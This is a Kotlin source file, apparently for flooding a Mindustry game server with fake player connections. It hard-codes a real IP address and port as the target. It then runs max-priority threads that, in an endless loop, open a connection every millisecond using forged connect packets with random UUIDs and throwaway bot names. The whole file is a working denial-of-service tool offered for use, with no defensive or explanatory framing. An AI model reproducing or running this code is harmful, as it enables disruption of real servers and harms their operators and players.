package io.lucin

import arc.math.Rand
import arc.struct.Seq
import arc.util.Http
import arc.util.Log
import arc.util.serialization.Base64Coder
import arc.util.serialization.Jval
import io.lucin.core.Entity
import mindustry.Vars
import mindustry.core.*
import mindustry.gen.Groups
import mindustry.net.Packets.ConnectPacket
import java.util.Timer
import java.util.TimerTask

var targets = listOf(
    "5.228.122.149:6567"
)

var counter = 0

fun main() {
    init()

    val timer = Timer()
    timer.scheduleAtFixedRate(object : TimerTask() {
        override fun run() {
            System.gc()
        }
    }, 0, 1000)

    targets.forEach { target ->
        Log.info(target)

        val thread = Thread { task(target) }
        thread.priority = Thread.MAX_PRIORITY;
        thread.start()
    }
}

private fun init() {
    Groups.init()
    Vars.world = World()

    Vars.content = ContentLoader()
    Vars.content.createBaseContent()

    Vars.state = GameState()

    Version.build = 141
}

private fun packet(): ConnectPacket {
    val packet = ConnectPacket()

    packet.version = -1
    packet.versionType = "hentai"

    packet.name = "nekonya-" + counter++
    packet.color = 255
    packet.locale = "nya"

    packet.mods = Seq()
    packet.mobile = true

    packet.uuid = uuid()
    packet.usid = usid()

    return packet
}

private fun task(address: String) {
    val fullAddress = address.split(':')
    val ip = fullAddress[0]
    val port = fullAddress[1].toInt()

    while (true) {
        Entity.EntityBuilder(false, packet(), ip, port, port)
        Thread.sleep(1)
    }

    while (true) {}
}

private fun uuid(): String {
    val bytes = ByteArray(8)
    Rand().nextBytes(bytes)
    return String(Base64Coder.encode(bytes))
}

private fun usid(): String {
    val result = ByteArray(8)
    Rand().nextBytes(result)
    return String(Base64Coder.encode(result))
}
